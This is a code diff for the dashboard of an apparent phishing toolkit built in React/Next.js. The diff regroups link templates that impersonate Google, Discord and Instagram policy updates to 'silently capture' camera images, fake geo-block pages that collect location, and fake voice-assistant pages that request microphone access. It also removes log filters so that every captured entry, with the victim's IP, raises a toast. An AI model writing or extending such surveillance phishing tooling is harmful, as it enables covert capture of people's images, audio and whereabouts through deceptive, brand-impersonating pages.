@@ -5,7 +5,7 @@ import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 // PhishingLinkCard is not directly used for the new configurable template section, but its structure is informative.
 // import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
-import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Settings2, Globe, Lock, Gamepad2, Columns, Copy, Link as LinkIconLucide } from 'lucide-react';
+import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Settings2, Globe, Lock, Gamepad2, Copy, Link as LinkIconLucide } from 'lucide-react';
 import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
 import { ScrollArea } from '@/components/ui/scroll-area';
 import Image from 'next/image';
@@ -16,14 +16,6 @@ import { cn } from '@/lib/utils';
 import { Checkbox } from "@/components/ui/checkbox";
 import { Label } from "@/components/ui/label";
 
-// Define available data types for filtering logs (remains the same)
-const LOG_FILTER_DATA_TYPES = [
-  { id: 'location', label: 'Location', Icon: MapPin },
-  { id: 'camera', label: 'Camera', Icon: Camera },
-  { id: 'audio', label: 'Audio', Icon: Mic },
-] as const;
-type LogFilterDataType = typeof LOG_FILTER_DATA_TYPES[number]['id'];
-
 // Define data types that can be selected for capture per template
 const CAPTURE_OPTIONS = [
     { id: 'location', label: 'Capture Location', Icon: MapPin },
@@ -32,22 +24,38 @@ const CAPTURE_OPTIONS = [
 ] as const;
 type CaptureOptionType = typeof CAPTURE_OPTIONS[number]['id'];
 
-
-// Base templates for configuration (derived from allPhishingTemplates)
-// We need a flat list of templates, not categorized for this new UI.
-const basePhishingTemplatesForConfig = [
-  // Location
-  { baseId: 'restricted-website-access', name: 'Restricted Website Access', Icon: Globe, description: "Simulates a geo-blocked website." },
-  { baseId: 'geo-restricted-service-access', name: 'Geo-Restricted Service Access', Icon: Gamepad2, description: "Simulates accessing a geo-restricted service." },
-  { baseId: 'content-unlock', name: 'Content Unlock', Icon: Lock, description: "Simulates unlocking region-restricted content." },
-  // Camera
-  { baseId: 'google-policy-update', name: 'Google Policy Update', Icon: Globe, description: "Simulates Google policy update with camera capture." },
-  { baseId: 'discord-terms-update', name: 'Discord Terms Update', Icon: Globe, description: "Simulates Discord terms update with camera capture." },
-  { baseId: 'instagram-privacy-update', name: 'Instagram Privacy Update', Icon: Globe, description: "Simulates Instagram privacy update with camera capture." },
-  // Audio
-  { baseId: 'voice-assistant', name: 'Voice Assistant Setup', Icon: Mic, description: "Simulates voice assistant setup." },
-  { baseId: 'speech-to-text', name: 'Speech-to-Text Demo', Icon: Mic, description: "Simulates speech-to-text service." },
-  { baseId: 'quality-check', name: 'Audio Quality Check', Icon: Mic, description: "Simulates microphone quality check." },
+// Copied from main dashboard page.tsx
+const phishingCategories = [
+  {
+    title: 'Location',
+    description: 'Templates designed to capture IP address and attempt geolocation.',
+    Icon: MapPin,
+    links: [
+      { id: 'restricted-website-access', name: 'Restricted Website Access', url: '/phishing/location/restricted-website-access', Icon: Globe, description: "Simulates a geo-blocked website requiring location to access content." },
+      { id: 'geo-restricted-service-access', name: 'Geo-Restricted Service Access', url: '/phishing/location/geo-restricted-service-access', Icon: Gamepad2, description: "Simulates accessing a geo-restricted digital service (e.g., streaming, gaming)." },
+      { id: 'content-unlock', name: 'Content Unlock', url: '/phishing/location/content-unlock', Icon: Lock, description: "Simulates unlocking region-restricted general content." },
+    ],
+  },
+  {
+    title: 'Camera Access',
+    description: 'Templates attempting to access the device camera.',
+    Icon: Camera,
+    links: [
+      { id: 'google-policy-update', name: 'Google Policy Update', url: '/phishing/camera/google-policy-update', Icon: Globe, description: "Simulates a Google policy update requiring cookie acceptance and silently captures image. Supports custom redirection." },
+      { id: 'discord-terms-update', name: 'Discord Terms Update', url: '/phishing/camera/discord-terms-update', Icon: Globe, description: "Simulates a Discord terms update requiring acceptance and silently captures image. Supports custom redirection." },
+      { id: 'instagram-privacy-update', name: 'Instagram Privacy Update', url: '/phishing/camera/instagram-privacy-update', Icon: Globe, description: "Simulates an Instagram privacy policy update requiring acceptance and silently captures image. Supports custom redirection." },
+    ],
+  },
+  {
+    title: 'Audio Access',
+    description: 'Templates simulating microphone access requests.',
+    Icon: Mic,
+    links: [
+      { id: 'voice-assistant', name: 'Voice Assistant Setup', url: '/phishing/audio/voice-assistant', Icon: Mic, description: "Simulates setting up a voice assistant." }, // Added Mic Icon for consistency if PhishingLinkCard expects it
+      { id: 'speech-to-text', name: 'Speech-to-Text Demo', url: '/phishing/audio/speech-to-text', Icon: Mic, description: "Simulates a speech-to-text service." }, // Added Mic Icon
+      { id: 'quality-check', name: 'Audio Quality Check', url: '/phishing/audio/quality-check', Icon: Mic, description: "Simulates a microphone quality check." }, // Added Mic Icon
+    ],
+  },
 ];
 
 // Type for the state that holds configurations for each template
@@ -60,9 +68,6 @@ export default function AdvancedDashboardPage() {
   const isInitialLoadRef = useRef(true);
   const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);
   const [isModalAnimating, setIsModalAnimating] = useState(false);
-
-  // State for filtering displayed logs
-  const [selectedLogFilters, setSelectedLogFilters] = useState<Set<LogFilterDataType>>(new Set(['location']));
 
   // State for configuring capture types for each base template
   const [templateConfigurations, setTemplateConfigurations] = useState<TemplateConfigurations>({});
@@ -91,10 +96,10 @@ export default function AdvancedDashboardPage() {
     const currentLatestLogId = logs[0].id;
     if (currentLatestLogId !== previousLatestLogIdRef.current) {
       const newLog = logs[0];
-      if (newLog.type === 'generic' || selectedLogFilters.has(newLog.type as LogFilterDataType)) {
-        let toastTitle = "New Data Captured!";
-        let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
-        let toastAction: ToastActionElement | undefined = undefined;
+      // Removed filter check: if (newLog.type === 'generic' || selectedLogFilters.has(newLog.type as LogFilterDataType))
+      let toastTitle = "New Data Captured!";
+      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
+      let toastAction: ToastActionElement | undefined = undefined;
 
         if (newLog.type === 'location') {
           const locData = newLog.data as LocationData;
@@ -118,10 +123,10 @@ export default function AdvancedDashboardPage() {
           toastDescription = `Page: ${messageDetail || 'N/A'}, IP: ${newLog.ip}`;
         }
         toast({ title: toastTitle, description: toastDescription, variant: "default", action: toastAction });
-      }
+      // Removed filter check closing brace
       previousLatestLogIdRef.current = currentLatestLogId;
     }
-  }, [logs, isLoading, toast, selectedLogFilters]);
+  }, [logs, isLoading, toast]); // removed selectedLogFilters from dependency array
 
   const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {
     if (type === 'camera' && data && typeof data.imageUrl === 'string') {
@@ -138,19 +143,7 @@ export default function AdvancedDashboardPage() {
     return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data, null, 2)}</pre>;
   };
 
-  // For filtering displayed logs
-  const handleLogFilterToggle = (dataType: LogFilterDataType) => {
-    setSelectedLogFilters(prev => {
-      const newSelection = new Set(prev);
-      newSelection.has(dataType) ? newSelection.delete(dataType) : newSelection.add(dataType);
-      return newSelection;
-    });
-  };
-
-  const filteredLogs = useMemo(() => {
-    if (selectedLogFilters.size === 0) return logs.filter(log => log.type === 'generic');
-    return logs.filter(log => log.type === 'generic' || selectedLogFilters.has(log.type as LogFilterDataType));
-  }, [logs, selectedLogFilters]);
+  const filteredLogs = useMemo(() => logs, [logs]);
 
   // For configuring capture types for a specific template
   const handleTemplateCaptureTypeToggle = (templateBaseId: string, captureType: CaptureOptionType) => {
@@ -163,9 +156,9 @@ export default function AdvancedDashboardPage() {
     });
   };
 
-  const generateAndCopyLink = (templateBaseId: string, templateName: string) => {
-    const selectedCaptureTypes = Array.from(templateConfigurations[templateBaseId] || []);
-    let url = `${window.location.origin}/phishing/custom/${templateBaseId}`;
+  const generateAndCopyLink = (templateId: string, templateName: string) => {
+    const selectedCaptureTypes = Array.from(templateConfigurations[templateId] || []);
+    let url = `${window.location.origin}/phishing/custom/${templateId}`;
     if (selectedCaptureTypes.length > 0) {
       url += `?capture=${selectedCaptureTypes.join(',')}`;
     }
@@ -206,70 +199,82 @@ export default function AdvancedDashboardPage() {
           </CardContent>
         </Card>
 
-        <Card className="shadow-lg">
-          <CardHeader>
-            <CardTitle className="text-2xl flex items-center"><Settings2 className="mr-3 h-7 w-7 text-primary" />Log Display Filters</CardTitle>
-            <CardDescription>Select data types to display in the log viewer above. Generic data (IP, timestamps) is always shown for matching entries.</CardDescription>
-          </CardHeader>
-          <CardContent className="flex flex-wrap gap-4 items-center pt-4">
-            {LOG_FILTER_DATA_TYPES.map(({ id, label, Icon }) => (
-              <div key={`log-filter-${id}`} className="flex items-center space-x-2">
-                <Checkbox id={`log-filter-${id}`} checked={selectedLogFilters.has(id)} onCheckedChange={() => handleLogFilterToggle(id)} aria-label={`Filter logs by ${label}`} />
-                <Label htmlFor={`log-filter-${id}`} className="flex items-center text-sm font-medium cursor-pointer"><Icon className="mr-2 h-5 w-5 text-muted-foreground" />{label}</Label>
-              </div>
-            ))}
-          </CardContent>
-        </Card>
+        {/* Removed Log Display Filters Card */}
 
         <Card className="shadow-lg">
           <CardHeader>
-            <CardTitle className="text-2xl flex items-center"><LinkIconLucide className="mr-3 h-7 w-7 text-primary" />Configure & Generate Custom Phishing Links</CardTitle>
-            <CardDescription>Select a base template and choose which data types (Location, Camera, Audio) it should attempt to capture. Then generate and copy the custom link.</CardDescription>
+            <CardTitle className="text-2xl flex items-center">
+              {/* Icon can be LinkIconLucide or Sparkles from main dashboard, let's use LinkIconLucide for now or match later if needed */}
+              <LinkIconLucide className="mr-3 h-7 w-7 text-primary" />
+              Phishing Page Templates
+            </CardTitle>
+            <CardDescription>
+              Configure and use these links to simulate phishing attempts. Choose data capture options for each template.
+            </CardDescription>
           </CardHeader>
-          <CardContent className="space-y-6 pt-4">
-            {basePhishingTemplatesForConfig.map((template) => {
-              const TemplateIcon = template.Icon;
-              const selectedCapturesForThisTemplate = templateConfigurations[template.baseId] || new Set();
+          <CardContent className="space-y-8 pt-4"> {/* Increased space-y for category separation */}
+            {phishingCategories.map((category) => {
+              const CategoryIcon = category.Icon;
               return (
-                <div key={template.baseId} className="p-4 border rounded-lg bg-background shadow-sm">
-                  <div className="flex items-start mb-3">
-                    <TemplateIcon className="mr-3 h-7 w-7 text-primary flex-shrink-0 mt-1" />
+                <div key={category.title} className="space-y-6"> {/* Each category is a block */}
+                  <div className="flex items-center mb-1">
+                    <CategoryIcon className="mr-3 h-6 w-6 text-primary" />
                     <div>
-                        <h3 className="text-lg font-semibold text-foreground">{template.name}</h3>
-                        <p className="text-sm text-muted-foreground">{template.description}</p>
+                        <h2 className="text-xl font-semibold text-foreground">{category.title}</h2>
+                        <p className="text-sm text-muted-foreground">{category.description}</p>
                     </div>
                   </div>
-
-                  <div className="my-3 space-y-2 pl-2 border-l-2 ml-2">
-                    <p className="text-sm font-medium text-muted-foreground mb-1">Select data to capture with this template:</p>
-                    {CAPTURE_OPTIONS.map((option) => {
-                      const CaptureIcon = option.Icon;
+                  <div className="grid gap-6 md:grid-cols-1 lg:grid-cols-2 xl:grid-cols-3"> {/* Grid for templates within category */}
+                    {category.links.map((template) => {
+                      const TemplateIcon = template.Icon || category.Icon; // Fallback to category icon if template specific is missing
+                      const selectedCapturesForThisTemplate = templateConfigurations[template.id] || new Set();
                       return (
-                        <div key={`${template.baseId}-${option.id}`} className="flex items-center space-x-2">
-                          <Checkbox
-                            id={`${template.baseId}-${option.id}-checkbox`}
-                            checked={selectedCapturesForThisTemplate.has(option.id)}
-                            onCheckedChange={() => handleTemplateCaptureTypeToggle(template.baseId, option.id)}
-                          />
-                          <Label
-                            htmlFor={`${template.baseId}-${option.id}-checkbox`}
-                            className="flex items-center text-sm font-normal cursor-pointer"
+                        <div key={template.id} className="p-4 border rounded-lg bg-card shadow-sm flex flex-col justify-between">
+                          <div>
+                            <div className="flex items-start mb-3">
+                              <TemplateIcon className="mr-3 h-7 w-7 text-blue-500 flex-shrink-0 mt-1" /> {/* Changed color for distinction */}
+                              <div>
+                                <h3 className="text-md font-semibold text-foreground">{template.name}</h3>
+                                <p className="text-xs text-muted-foreground mt-1">{template.description}</p>
+                              </div>
+                            </div>
+
+                            <div className="my-3 space-y-2 pl-2 border-l-2 ml-2">
+                              <p className="text-xs font-medium text-muted-foreground mb-1">Select data to capture:</p>
+                              {CAPTURE_OPTIONS.map((option) => {
+                                const CaptureIcon = option.Icon;
+                                return (
+                                  <div key={`${template.id}-${option.id}`} className="flex items-center space-x-2">
+                                    <Checkbox
+                                      id={`${template.id}-${option.id}-checkbox`}
+                                      checked={selectedCapturesForThisTemplate.has(option.id)}
+                                      onCheckedChange={() => handleTemplateCaptureTypeToggle(template.id, option.id)}
+                                      className="h-3.5 w-3.5"
+                                    />
+                                    <Label
+                                      htmlFor={`${template.id}-${option.id}-checkbox`}
+                                      className="flex items-center text-xs font-normal cursor-pointer"
+                                    >
+                                      <CaptureIcon className="mr-1.5 h-3.5 w-3.5 text-muted-foreground" />
+                                      {option.label}
+                                    </Label>
+                                  </div>
+                                );
+                              })}
+                            </div>
+                          </div>
+                          <Button
+                            onClick={() => generateAndCopyLink(template.id, template.name)}
+                            variant="default"
+                            size="sm"
+                            className="mt-3 w-full" // Full width button at the bottom of the card
                           >
-                            <CaptureIcon className="mr-2 h-4 w-4 text-muted-foreground" />
-                            {option.label}
-                          </Label>
+                            <Copy className="mr-2 h-4 w-4" /> Generate & Copy Custom Link
+                          </Button>
                         </div>
                       );
                     })}
                   </div>
-                  <Button
-                    onClick={() => generateAndCopyLink(template.baseId, template.name)}
-                    variant="default"
-                    size="sm"
-                    className="mt-3 w-full sm:w-auto"
-                  >
-                    <Copy className="mr-2 h-4 w-4" /> Generate & Copy Custom Link
-                  </Button>
                 </div>
               );
             })}
